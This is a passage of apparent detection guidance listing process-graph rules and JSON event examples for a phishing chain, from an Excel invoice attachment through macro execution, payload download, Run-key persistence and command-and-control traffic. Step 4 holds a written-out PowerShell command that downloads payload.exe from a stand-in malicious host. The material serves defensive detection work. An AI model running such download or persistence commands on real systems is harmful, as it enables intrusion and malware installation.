

2. **Track Opening of Malicious Attachment**  
   - Detect when the `srcNode` is Outlook and the `dstNode` is Excel, with the `dstNode` having the `Image` or `Cmdline` indicating it is opening "Invoice_2023.xlsx".  
   - Set the `relation` to "Process Create".  
   - Example:  
     ```json
     {
       "srcNode": {
         "Name": "Outlook",
         "Type": "Process"
       },
       "dstNode": {
         "Image": "C:\\Program Files\\Microsoft Office\\root\\Office16\\EXCEL.EXE",
         "Cmdline": "C:\\Program Files\\Microsoft Office\\root\\Office16\\EXCEL.EXE \"C:\\path\\to\\Invoice_2023.xlsx\"",
         "Type": "Process"
       },
       "relation": "Process Create"
     }
     ```

3. **Monitor for Macro Execution in Excel**  
   - Identify events where the `srcNode` is Excel and the `relation` indicates macro execution (e.g., "Process Create").  
   - Look for the presence of macro code in the `dstNode` indicating it is executing upon opening.  
   - Example:  
     ```json
     {
       "srcNode": {
         "Image": "C:\\Program Files\\Microsoft Office\\root\\Office16\\EXCEL.EXE",
         "Type": "Process"
       },
       "dstNode": {
         "Name": "Macro Code",
         "Type": "Process"
       },
       "relation": "Process Create"
     }
     ```

4. **Detect PowerShell Command for Downloading Payload**  
   - Monitor for events where the `srcNode` is Excel and the `dstNode` is PowerShell executing a command to download a file from a remote server.  
   - The `Cmdline` should include the PowerShell command with the URL "http://malicious-server.com/payload.exe".  
   - Example:  
     ```json
     {
       "srcNode": {
         "Image": "C:\\Program Files\\Microsoft Office\\root\\Office16\\EXCEL.EXE",
         "Type": "Process"
       },
       "dstNode": {
         "Image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
         "Cmdline": "powershell.exe -Command \"Invoke-WebRequest -Uri 'http://malicious-server.com/payload.exe' -OutFile 'C:\\Users\\Victim\\Downloads\\payload.exe'\"",
         "Type": "Process"
       },
       "relation": "Process Create"
     }
     ```

5. **Monitor Execution of Downloaded Payload**  
   - Identify events where the `srcNode` is PowerShell and the `dstNode` is the executable "payload.exe".  
   - Set the `relation` to "Process Create".  
   - Example:  
     ```json
     {
       "srcNode": {
         "Image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
         "Type": "Process"
       },
       "dstNode": {
         "Image": "C:\\Users\\Victim\\Downloads\\payload.exe",
         "Type": "Process"
       },
       "relation": "Process Create"
     }
     ```

6. **Track Registry Modifications for Persistence**  
   - Monitor for events where the `srcNode` is "payload.exe" and the `dstNode` indicates a registry modification under `HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\MaliciousApp`.  
   - Set the `relation` to "RegSetValue".  
   - Example:  
     ```json
     {
       "srcNode": {
         "Image": "C:\\Users\\Victim\\Downloads\\payload.exe",
         "Type": "Process"
       },
       "dstNode": {
         "Key": "HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\MaliciousApp",
         "Type": "Registry"
       },
       "relation": "RegSetValue"
     }
     ```

7. **Monitor Command and Control Communication**  
   - Identify outbound network traffic where the `srcNode` is "payload.exe" and the `dstNode` indicates a connection to "http://malicious-server.com".  
   - Set the `relation` to "TCP Connect".  
   - Example:  
     ```json
     {
       "srcNode": {
         "Image": "C:\\Users\\Victim\\Downloads\\payload.exe",
         "Type": "Process"
       },
       "dstNode": {
         "Dstaddress": "malicious-server.com",
         "Port": 80,
         "Type": "Network"
       },
       "relation": "TCP Connect"
     }
     ```